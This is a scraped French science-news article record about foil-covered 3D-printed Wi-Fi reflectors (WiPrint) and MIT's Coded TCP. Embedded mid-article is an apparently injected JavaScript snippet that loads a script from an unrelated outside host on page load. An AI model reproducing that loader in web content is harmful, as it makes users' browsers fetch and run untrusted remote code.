{"title": "Wi-Fi : ils ameliorent leur connexion grace a une simple feuille d'aluminium", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2012-11-08", "content": "Des chercheurs viennent de demontrer qu'il est possible d'ameliorer la portee d'une connexion Wi-Fi en se servant d'un reflecteur fabrique par impression 3D et recouvert d'une simple feuille d'aluminium afin d'orienter le signal emis par le routeur. Une solution economique qui peut, en prime, aider a securiser la connexion sans fil. Bricoler une antenne radio endommagee, ou pas assez puissante, avec une feuille de papier aluminium est une astuce connue de longue date. Il s'avere que cette technique rudimentaire peut aussi aider a ameliorer la puissance d'un signal  Wi-Fi , et meme renforcer sa protection. Une equipe de chercheurs de l'universite  Dartmouth College  (Etats-Unis) a en effet decouvert que des reflecteurs de differentes formes recouverts de feuilles d'aluminium et places a l'arriere de routeurs  Wi-Fi  contribuaient a ameliorer la puissance du signal dans un espace donne en orientant ce dernier de facon ciblee. Actuellement, la principale solution technique pour optimiser une connexion Wi-Fi dans un environnement fait de plusieurs pieces implique l'usage d'antennes directionnelles, qui permettent de concentrer le signal. Mais cela coute cher et necessite une configuration assez complexe. La solution ici evoquee, baptisee  WiPrint , est beaucoup plus simple et moins onereuse.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les reflecteurs peuvent augmenter la force d'un signal Wi-Fi de 6 dB Les chercheurs ont developpe un logiciel qui simule la propagation du signal radio dans un espace et ses interactions avec les objets qu'il rencontre ainsi qu'un algorithme pour creer des modeles de reflecteurs avec des formes qui assurent une couverture optimisee. Une fois que le systeme dispose des informations necessaires (surface, encombrement, emplacement du point d'acces Wi-Fi, zones a couvrir et a exclure), il lui faut une vingtaine de minutes pour produire un modele de reflecteur qui pourra ensuite etre fabrique avec une  imprimante 3D  avant d'etre recouvert d'aluminium. Selon les essais realises par l'equipe de l'universite de Dartmouth, les reflecteurs peuvent augmenter la force d'un  signal Wi-Fi  de 6 dB et la reduire de 10 dB dans les zones qui doivent etre exclues. Le cout de fabrication est estime a 35 dollars (environ 30 euros au cours actuel). Les chercheurs comptent aller plus loin en explorant l'usage de materiaux alternatifs au plastique qui permettraient de fabriquer des reflecteurs susceptibles d'adapter leur forme automatiquement lorsque la configuration de l'environnement change. Ils etudieront egalement l'efficacite du dispositif avec les ondes millimetriques et la lumiere visible.  Pour en savoir plus Des mathematiques pour decupler le debit du Wi-Fi Article initial de Sylvain Biget, paru le 08/11/2012 Des chercheurs du MIT et de plusieurs universites ont trouve le moyen de decupler les  debits  du Wi-Fi sans apporter de modifications au materiel. Ils ont supprime le systeme de correction d'erreurs habituellement utilise, pour le remplacer par des  equations  mathematiques et reconstituer les elements manquants.  Comment decupler les debits du  Wi-Fi  ? Augmenter la puissance de l'emetteur, la taille du spectre ? Rien de tout cela, aucune modification materielle ne serait necessaire : il suffirait de penser differemment. C'est la conclusion a laquelle sont parvenues des equipes de chercheurs du MIT, du Caltech, de Harvard, de l'universite technique de Munich (Allemagne) et celle de Porto (Portugal). Ils sont partis du constat que ce qui limite les debits, c'est la perte de paquets de donnees durant le transfert. En effet, lorsque des paquets de donnees transitent dans les  airs , il y a en moyenne 5 % de perte de donnees. Lorsqu'un paquet est perdu, il doit etre renvoye de nouveau. Le systeme doit alors transmettre des donnees a l'emetteur pour qu'il reachemine le paquet egare. En multipliant ces manoeuvres par le nombre de paquets perdus, le debit ralentit considerablement. C'est cet inconvenient que les scientifiques sont parvenus a eliminer. Pour cela, ils ont cree un systeme reposant sur l'algebre, qui reconstitue les donnees perdues au lieu d'occuper la  bande passante  inutilement. Le paquet de donnees est transforme en equations  mathematiques . Lorsque les donnees transitent, si un fragment est manquant, le recepteur utilise ceux dont il dispose, et se sert de l'equation qu'il a recue pour recalculer le paquet manquant au lieu de le reclamer et d'attendre qu'il arrive. Comme les equations sont simples et lineaires, la charge de traitement est faible pour le materiel, qu'il s'agisse d'un mobile, ou d'un  routeur  Wi-Fi. Dans ce schema, avec le Coded TCP ou E2-TCP/NC, lorsque des donnees sont perdues (lost packet), le systeme (ACK) qui accuse habituellement de la non-reception des donnees, ne le fait pas. Le debit n'est donc pas bloque par l'attente de ces paquets. (c) MIT, Institut de telecommunications de l'universite de Porto                               Les etonnants resultats de Coded TCP sur le Wi-Fi Lors de leurs experimentations avec ce systeme qu'ils ont baptise <<  Coded TCP  >> ou encore << E2E-TCP/NC >>, les chercheurs ont obtenu des resultats etonnants. Ils avaient constate que sur le  reseau Wi-Fi  du MIT, la perte moyenne des paquets s'elevait a 2 %. En utilisant leur systeme, une bande passante delivrant un debit habituellement limite a 1 Mbit par seconde a decolle a 16 Mbit par seconde ! Autre exemple, avec 5 % de perte de paquets sur une bande passante de 0,5 Mbit/s, le debit restait tout de meme eleve a 13,5 Mbit/s. Si cette technique peut etre appliquee sur un reseau Wi-Fi, il est egalement possible de l'utiliser sur le reseau mobile en 3 et 4 G. Confiants, les scientifiques estiment que la technologie pourrait etre deployee massivement sur les reseaux dans les 2 ou 3 ans. Et ce n'est pas du domaine du reve, puisque le MIT et la Caldec ont deja vendu des licences Coded TCP a plusieurs equipementiers via  Code-On , une startup qu'ils ont creee pour l'occasion. C'est certainement pourquoi l'equipe ne delivre pas de plus amples details sur sa technologie. ", "theme": "tech"}